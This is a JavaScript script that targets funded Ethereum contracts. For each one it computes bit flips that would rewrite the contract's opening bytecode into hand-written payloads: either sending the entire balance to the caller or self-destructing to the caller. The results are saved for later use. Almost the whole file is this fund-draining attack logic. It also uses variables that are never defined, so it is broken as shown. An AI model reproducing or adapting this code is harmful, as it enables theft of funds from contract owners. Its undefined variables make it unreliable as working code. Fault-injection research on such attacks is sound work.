require('dotenv').config()
const { ethers } = require("ethers");
const fs = require('fs')
const utils = require('./utils')


const FORK_BLOCK = 18437826
const BALS_PATH = './bals.csv'
const BITFLIPS_PATH = './bitflips'

function replacement1() {
    /*
        PUSH1 0
        PUSH1 0
        PUSH1 0
        PUSH1 0
        SELFBALANCE
        CALLER
        PUSH2 0xFFFF
        CALL
        STOP

        6000600060006000473361fffff100
    */
   return "6000600060006000473361fffff100"
}

function replacement2() {
    /*
        CALLER	
		SELFDESTRUCT

        33ff
    */
   return "33ff"
}

async function generateBitflips() {
	const viewProviderRpc = process.env.ETH_RPC_VIEW
	const viewProvider = new ethers.providers.JsonRpcProvider(viewProviderRpc)	

	const replacement = replacement2()
	const forkBlock = FORK_BLOCK
	const contracts = utils.getContracts(BALS_PATH)

	const handled = includedContracts.length
	const full = targetContracts.length + handled
	
	const handledContracts = {}
	for (let i=0; i < contracts.length; i++) {
		const c = contracts[i]
		if (handledContracts[c]) {
			console.log(`${i} already handled contract: ${c}`)
			continue
		}
		handledContracts[c] = true
		console.log(`${i+handled}/${full} handling contract: ${c}`)
		const code = await viewProvider.getCode(c).then(c => c.slice(2))
		if (code.length < replacement.length) {
			console.log('\tnot long enough code; skipping')
			continue
		}
		const bal = await viewProvider.getBalance(c, forkBlock)
		if (bal.eq(0)) {
			console.log('\tzero balance; skipping')
			continue
		}
		const flips = utils.findFlips('0x' + code, '0x' + replacement)
		const codeBytes = Array.from(Buffer.from(code.slice(0, replacement.length), 'hex'))
		const flippedCode =  Buffer.from(utils.flipCode(codeBytes, flips).slice(0, replacement.length)).toString('hex')
		if (replacement != flippedCode) {
			console.log(flippedCode, replacement)
			throw new Error('flipping failed')
		}
		const formatted = [c, ...flips].join(':')
		fs.appendFileSync(BITFLIPS_PATH, formatted + ',')
	}

}

generateBitflips()